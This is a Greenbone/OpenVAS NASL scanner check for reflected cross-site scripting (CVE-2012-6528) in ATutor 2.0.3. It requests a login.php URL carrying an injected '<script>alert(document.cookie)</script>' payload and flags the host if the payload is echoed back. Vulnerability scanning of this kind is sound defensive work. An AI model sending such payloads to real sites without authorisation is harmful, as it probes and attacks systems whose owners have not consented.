CPE = "cpe:/a:atutor:atutor";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802561" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_bugtraq_id( 51423 );
	script_cve_id( "CVE-2012-6528" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-01-17 12:09:44 +0530 (Tue, 17 Jan 2012)" );
	script_name( "Atutor Multiple Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51423/info" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521260" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/108706/SSCHADV2012-002.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_atutor_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "atutor/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "ATutor version 2.0.3." );
	script_tag( name: "insight", value: "Multiple flaws are due to an input passed to the various pages are not
  properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "Update to ATutor Version 2.1." );
	script_tag( name: "summary", value: "This host is running Atutor and is prone to multiple cross site
  scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/login.php/index.php<script>alert(document.cookie)</script>/index.php";
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document.cookie\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

